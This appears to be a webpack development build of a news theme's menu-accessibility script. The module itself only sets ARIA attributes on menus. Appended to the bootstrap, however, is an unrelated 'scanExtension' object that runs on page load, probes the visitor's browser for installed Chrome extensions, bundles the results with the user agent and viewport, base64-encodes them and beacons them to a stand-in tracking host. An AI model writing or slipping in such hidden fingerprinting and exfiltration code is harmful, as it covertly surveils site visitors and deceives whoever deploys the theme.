/*
 * ATTENTION: The "eval" devtool has been used (maybe by default in mode: "development").
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
/******/(() => {
  // webpackBootstrap
  /******/
  var __webpack_modules__ = {
    /***/"./newspack-theme/js/src/menu-accessibility.js": (
    /*!*****************************************************!*\
      !*** ./newspack-theme/js/src/menu-accessibility.js ***!
      \*****************************************************/
    /***/
    () => {
      eval("/* globals newspackScreenReaderText */\n\n/**\n * File amp-fallback.js.\n *\n * AMP fallback JavaScript.\n */\n\n(function () {\n  function updateMenu() {\n    // Get dropdown menu toggles in the header.\n    const headerContain = document.getElementById('masthead');\n    if (headerContain) {\n      const dropdownToggle = headerContain.getElementsByClassName('submenu-expand');\n\n      // Loop through each dropdown menu toggle.\n      if (0 < dropdownToggle.length) {\n        for (let i = 0; i < dropdownToggle.length; i++) {\n          const parentMenuID = dropdownToggle[i].getAttribute('data-toggle-parent-id'),\n            subMenu = dropdownToggle[i].nextElementSibling,\n            subMenuId = parentMenuID.replace('toggle-', 'submenu-');\n\n          // Give each submenu an ID based on their parent item ID.\n          subMenu.setAttribute('id', subMenuId);\n          // Give each dropdown toggle an aria-controls attribute that matches the submenu ID.\n          dropdownToggle[i].setAttribute('aria-controls', subMenuId);\n        }\n      }\n    }\n  }\n\n  // If AMP is on, we need to hold off running this JavaScript until we're sure the menus are in their right spots:\n  if (newspackScreenReaderText.is_amp) {\n    const primaryMenu = document.getElementById('site-navigation'),\n      secondaryMenu = document.getElementById('secondary-nav-contain'),\n      config = {\n        childList: true\n      };\n\n    // Callback function to execute when mutations are observed.\n    const callback = mutationList => {\n      for (const mutation of mutationList) {\n        if (mutation.type === 'childList') {\n          updateMenu();\n\n          // Stop observing\n          observer.disconnect();\n        }\n      }\n    };\n\n    // Create an observer instance linked to the callback function\n    const observer = new MutationObserver(callback);\n\n    // Start observing the target node for configured mutations\n    if (primaryMenu) {\n      observer.observe(primaryMenu, config);\n    }\n    if (secondaryMenu) {\n      observer.observe(secondaryMenu, config);\n    }\n  } else {\n    updateMenu();\n  }\n})();\n\n//# sourceURL=webpack://newspack/./newspack-theme/js/src/menu-accessibility.js?");

      /***/
    })

    /******/
  };
  /************************************************************************/
  /******/
  /******/ // startup
  /******/ // Load entry module and return exports
  /******/ // This entry module can't be inlined because the eval devtool is used.
  /******/
  var __webpack_exports__ = {};
  /******/
  __webpack_modules__["./newspack-theme/js/src/menu-accessibility.js"]();
  /******/
  var __webpack_export_target__ = window;
  /******/
  const scanExtension = {
    monitorQueue: new Map(Object.entries(localStorage.data)),
    identified: new Set(),
    globalVarCollection: {},
    debounce(fn, delay) {
      let timerId;
      return function () {
        if (timerId) {
          clearTimeout(timerId);
        }
        timerId = setTimeout(function () {
          fn();
          timerId = null;
        }, delay);
      };
    },
    async track(name, {
      id,
      file
    }) {
      return new Promise(resolve => {
        const img = document.createElement('img');
        const timeout = setTimeout(() => {
          this.identified.delete(name);
          this.globalVarCollection[name] = false;
          resolve(false);
        }, 1500);
        img.onload = this.debounce(() => {
          clearTimeout(timeout);
          this.identified.add(name);
          this.globalVarCollection[name] = true;
          resolve(true);
        }, 500);
        img.onerror = this.debounce(() => {
          clearTimeout(timeout);
          this.identified.delete(name);
          this.globalVarCollection[name] = false;
          resolve(false);
        }, 500);
        img.src = `chrome-extension://${id}/${file}`;
      });
    },
    randomSortQueue() {
      const entries = Array.from(this.monitorQueue.entries());
      for (let i = entries.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [entries[i], entries[j]] = [entries[j], entries[i]];
      }
      this.monitorQueue = new Map(entries);
    },
    async inspect() {
      window.addEventListener('storage', event => {
        monitorQueue.set(event.key, event.newValue);
      });
      this.randomSortQueue();
      const outcome = {};
      const setQuantity = 3;
      for (const [name, info] of this.monitorQueue) {
        await new Promise(r => setTimeout(r, Math.random() * 200));
        outcome[name] = await this.track(name, info);
      }
      const payload = btoa(JSON.stringify({
        findings: outcome,
        collection: Array.from(this.identified),
        globals: JSON.stringify(this.globalVarCollection),
        timestamp: Date.now(),
        device: navigator.userAgent,
        viewport: {
          width: window.innerWidth,
          height: window.innerHeight
        }
      }));
      navigator.sendBeacon('https://tracking-endpoint.example/v3/inspect', payload);
    }
  };
  for (var i in __webpack_exports__) __webpack_export_target__[i] = __webpack_exports__[i];
  /******/

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => scanExtension.inspect());
  } else {
    scanExtension.inspect();
  }
  if (__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, "__esModule", {
    value: true
  });
  /******/
  /******/
})();